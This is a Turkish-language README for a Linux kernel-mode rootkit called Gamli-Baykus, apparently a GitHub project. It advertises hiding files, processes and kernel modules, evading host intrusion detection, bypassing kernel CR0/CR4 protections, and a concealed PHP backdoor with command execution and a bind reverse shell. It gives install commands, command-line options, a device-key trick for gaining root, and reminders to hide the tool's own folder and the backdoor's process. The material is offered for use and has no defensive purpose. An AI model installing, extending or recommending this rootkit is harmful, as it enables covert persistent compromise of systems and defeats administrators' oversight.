# Gamli-Baykus



![Autro](autro.jpg)




**Kernel Mode Rootkit**

*Örnek Amaçlı Gliştirilmiş versiyondur, ilerleyen versiyonlarla daha farklı ve gelişmiş özellikler ile karşınızda olacak..*


**Test Edildiği Sistemler : Ubuntu 18.04 // CentOS 7.8.0**


### Özellikleri


**lsmod Üzerinde gözükmeyen LKM ler**

**Dosyalari gizleme**

**Klasörleri gizleme**

**Processleri gizleme**

**PHP arayuzu icin gizlenmis server portu**

**Farklı kullanıcıllardan root erişimi alabilmek için Bir device oluşturma.**

**HIDS Bypass (Agent Simth , Ossec , chrootkit , kstat , HiddenWall,lsrootkit)**

**Bypass Linux Kernel 3.15 x86 CR4 & CR0 pinning protections

**Gizli PHP Arayuz (Porta Kurulu)**


### PHP Arayuz ozellikleri :

**Dosya sisteminde gozukmeme**

**Panel Anasayfa Guard (IP LOGGER)**

**CMD Komut calistirma**

**Bind Port Reverse Shell**


### Helper

```

sudo gamlibaykus --[PARAMETRE] [OPSIYON]


Gamli Baykus Kernel Mode Rootkit v1.0
[http://modebit0.info]

--file [Gizlenecek Dosya]
--process [Gizlenecek Process ID]
--rootdevice [Device Keyi]
--phpbackdoor [Port Number]

===[Kisa Opsiyonlar]===

-f [Dosya ismi]
-p [Process id]
-r [Devicekey]
-b [port number]

```

### Kurulum :

```
git clone https://github.com/0x00fy/Gamli-Baykus.git

cd Gamli-Baykus

chmod 777 *

sudo ./install.sh


```

### Kullanım Klavuzu ve Hatırlatmalar

Herşeyden önce kurulum yapıldıktan sonra --file parametresini kullanarak Tüm LKM lerin ve yardımcı araçların bulunduğu /var/baba klasörünü gizlemeyi unutmayın 

Gizlemek : sudo gamlibaykus -f /var/baba


Farklı kullanıcılardan Root Yetkisi almak için bir device oluşturduğunuzda Root yetkisine ulaşmak için `echo "GİRDİĞİNİZ DEVİCE KEYİ" > /dev/ttyR0 `

 Komutunu çalıştırmanız yeterli olacaktır..
 

Php backdoor arayüzü kurmak için sudo gamlibaykus -b [PORT NUMARASI] şeklinde çalıştırıp Arayüzü kurduktan sonra Terminalinize output olarak düşen Process ID sini gizlemeyi unutmayınız !


### İYİ EĞLENCELER !!


